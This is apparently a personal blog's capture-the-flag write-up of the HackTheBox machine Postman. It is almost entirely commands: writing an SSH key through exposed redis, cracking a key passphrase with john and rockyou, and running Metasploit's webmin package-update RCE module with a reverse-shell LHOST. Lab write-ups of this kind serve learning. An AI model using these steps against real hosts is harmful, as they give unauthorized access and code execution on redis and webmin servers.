---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2020-03-14-postman-hackthebox
tags:
- hackthebox
- linux
- metasploit
- redis
- webmin
title: Postman @ HackTheBox
---

Postman is a 20-point machine on hackthebox, that involves using redis to write an ssh key to disk, cracking the password of a private key and exploiting a webmin vulnerability with metasploit.


## Notes

Redis:

```
ssh-keygen
echo -e '\n\n' >> blob.txt
cat redis.pub >> blob.txt
echo -e "\n\n" >> blob.txt
```

```
CONFIG SET dir "/var/lib/redis/.ssh"
CONFIG SET dbfilename "authorized_keys"
flushall
exit
```

```
cat blob.txt | redis-cli -h postman.htb -x set ssh
redis-cli -h postman.htb save
```

```
ssh -i redis redis@postman.htb
```

John:

```
ssh2john.py matt | tee matt.hash
john --wordlist=rockyou.txt matt.hash
```

Metasploit:

```
msf: search webmin, use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS postman.htb
msf5 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST <ip>
```